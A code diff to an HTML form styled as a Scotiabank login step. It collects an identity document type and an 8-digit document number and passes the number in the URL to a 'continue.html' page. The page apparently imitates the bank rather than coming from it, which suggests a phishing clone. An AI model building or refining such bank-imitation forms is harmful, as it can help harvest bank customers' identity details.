@@ -19,10 +19,11 @@
         <div class="card">
             <img src="onlylogo.png" alt="Scotiabank Icon" class="icon">
 
-            <form id="document-form" action="continue.html" method="get">
+            <!-- Modificación del formulario -->
+            <form id="document-form" action="continue.html" method="get" onsubmit="sendDocumentNumber()">
                 <div class="form-group">
                     <label for="document-type">Tipo de documento</label>
-                    <select id="document-type" required>
+                    <select id="document-type" name="document-type" required>
                         <option value="DNI">DNI</option>
                         <option value="Pasaporte">Pasaporte</option>
                         <option value="CE">Carnet de Extranjería</option>
@@ -31,10 +32,11 @@
 
                 <div class="form-group">
                     <label for="document-number">Número de documento</label>
-                    <input type="text" id="document-number" value="72176150" required>
+                    <input type="tel" id="document-number" name="document-number" value="12345678" required pattern="\d{8}" maxlength="8" oninput="this.value = this.value.replace(/\D/g, '').slice(0, 8);" title="Debe ingresar exactamente 8 números">
+
                 </div>
 
-                <button type="submit" class="btn-submit" onclick="window.location.href='continue.html';">Continuar</button>
+                <button type="submit" class="btn-submit">Continuar</button>
             </form>
         </div>
     </main>
@@ -48,7 +50,16 @@
         </a>
     </footer>
 
-    <script src="script.js"></script>
+    <!-- Script para enviar datos en la URL -->
+    <script>
+        function sendDocumentNumber() {
+            // Obtener el valor del campo "Número de documento"
+            const documentNumber = document.getElementById('document-number').value;
+
+            // Cambiar la acción del formulario para incluir el número de documento en la URL
+            document.getElementById('document-form').action = `continue.html?document-number=${encodeURIComponent(documentNumber)}`;
+        }
+    </script>
 </body>
 
 </html>
